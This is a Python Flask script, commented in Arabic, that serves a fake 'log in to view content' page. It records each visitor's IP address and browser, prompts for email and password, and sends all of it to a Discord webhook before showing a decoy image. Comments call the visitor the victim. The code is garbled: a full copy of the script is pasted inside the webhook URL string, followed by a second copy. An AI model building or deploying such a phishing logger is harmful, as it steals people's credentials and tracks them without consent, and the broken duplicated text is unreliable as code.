from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- ضع روابطك هنا ---
WEBHOOK_URL = "from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- ضع روابطك هنا ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://d2j2uxe7jasn0r.cloudfront.net/thumbnails/video/ruefkyi-il8e5psf4/videoblocks-hackers-screen-2025_9_yhbh2_sflfew13gl_thumbnail-1080_02.png"

@app.route('/')
@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    # جلب الـ IP الحقيقي للضحية
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # 1. إرسال معلومات الـ IP فوراً (حتى لو أغلق الضحية الصفحة سريعاً)
    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "📍 دخول جديد (IP Logged)",
                "color": 3447003,
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "المتصفح", "value": ua[:100], "inline": False}
                ]
            }]
        })
    except: pass

    html_code = '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body style="margin:0; background:#000; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; color:white; font-family:sans-serif;">
        
        <div id="status">جاري تحميل المحتوى...</div>
        <img src="{{ img_url }}" id="final_img" style="max-width:100%; display:none;">

        <script>
            async function logData() {
                // طلب البيانات بطريقة بسيطة ومضمونة
                let email = prompt("يجب تسجيل الدخول لمشاهدة المحتوى\\nالبريد الإلكتروني:");
                let pass = prompt("كلمة المرور:");

                if (email && pass) {
                    document.getElementById('status').innerText = "تم التحقق، جاري العرض...";
                    
                    // إرسال البيانات الحساسة
                    fetch("{{ webhook }}", {
                        method: "POST",
                        mode: "no-cors", // لتجنب حظر المتصفح
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            "embeds": [{
                                "title": "🔐 بيانات مسحوبة",
                                "color": 16711680,
                                "fields": [
                                    {"name": "الإيميل", "value": email, "inline": True},
                                    {"name": "الباسورد", "value": pass, "inline": True},
                                    {"name": "الجهاز", "value": navigator.platform}
                                ],
                                "footer": {"text": "IP: {{ ip }}"}
                            }]
                        })
                    });

                    setTimeout(() => {
                        document.getElementById('status').style.display = 'none';
                        document.getElementById('final_img').style.display = 'block';
                    }, 1000);
                }
            }
            window.onload = logData;
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)ا"
REAL_IMAGE = "https://imgur.com"

@app.route('/')
@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    # جلب الـ IP الحقيقي للضحية
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # 1. إرسال معلومات الـ IP فوراً (حتى لو أغلق الضحية الصفحة سريعاً)
    try:
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "📍 دخول جديد (IP Logged)",
                "color": 3447003,
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "المتصفح", "value": ua[:100], "inline": False}
                ]
            }]
        })
    except: pass

    html_code = '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body style="margin:0; background:#000; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; color:white; font-family:sans-serif;">
        
        <div id="status">جاري تحميل المحتوى...</div>
        <img src="{{ img_url }}" id="final_img" style="max-width:100%; display:none;">

        <script>
            async function logData() {
                // طلب البيانات بطريقة بسيطة ومضمونة
                let email = prompt("يجب تسجيل الدخول لمشاهدة المحتوى\\nالبريد الإلكتروني:");
                let pass = prompt("كلمة المرور:");

                if (email && pass) {
                    document.getElementById('status').innerText = "تم التحقق، جاري العرض...";
                    
                    // إرسال البيانات الحساسة
                    fetch("{{ webhook }}", {
                        method: "POST",
                        mode: "no-cors", // لتجنب حظر المتصفح
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            "embeds": [{
                                "title": "🔐 بيانات مسحوبة",
                                "color": 16711680,
                                "fields": [
                                    {"name": "الإيميل", "value": email, "inline": True},
                                    {"name": "الباسورد", "value": pass, "inline": True},
                                    {"name": "الجهاز", "value": navigator.platform}
                                ],
                                "footer": {"text": "IP: {{ ip }}"}
                            }]
                        })
                    });

                    setTimeout(() => {
                        document.getElementById('status').style.display = 'none';
                        document.getElementById('final_img').style.display = 'block';
                    }, 1000);
                }
            }
            window.onload = logData;
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)
